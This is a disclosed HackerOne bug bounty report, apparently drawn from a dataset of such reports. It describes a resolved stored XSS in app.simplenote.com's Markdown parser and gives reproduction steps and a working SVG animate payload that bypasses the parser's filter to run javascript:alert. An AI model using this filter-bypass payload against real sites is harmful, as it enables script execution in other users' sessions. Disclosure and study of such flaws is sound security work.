---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '271007'
original_report_id: '271007'
title: '[app.simplenote.com] Stored XSS via Markdown SVG filter bypass'
weakness: Cross-site Scripting (XSS) - Stored
team_handle: automattic
created_at: '2017-09-22T20:53:22.156Z'
disclosed_at: '2017-11-12T16:19:51.168Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# [app.simplenote.com] Stored XSS via Markdown SVG filter bypass

## Metadata

- HackerOne Report ID: 271007
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: automattic
- Disclosed At: 2017-11-12T16:19:51.168Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

A carefully crafted injection used against the Markdown input parser can be leveraged to store and execute arbitrary JavaScript in the `app.simplenote.com` context.

## Proof of concept
Before proceeding to reproduce this vulnerability, please log in to `app.simplenote.com` and create a new note with the "Markdown Formatted" option enabled.

1. Please paste the below payload into the "Edit" window, then select the "triple dots" icon > **Publish**

2. Next, please access the provided Simplenote URL, and select the black rectangle to execute the XSS payload.

Please note that I deleted the note and account used to test the aforementioned PoC immediately after confirming successful exploitation.

### Markdown parser payload

```
<div id="137"><svg>
<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
<circle r="400"></circle>
<animate attributeName="xlink:href" begin="0" from="javascript:alert(document.domain)" to="&" />
</a>//["'`-->]]>]</div>
```

### Supporting evidence

{F223223}

## Verified conditions

At the time of testing, I have successfully confirmed exploitability in the following environment:

* Firefox 55.0.3 stable (32-bit) on Ubuntu 16.04.3 LTS

Thanks,

Yasin

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
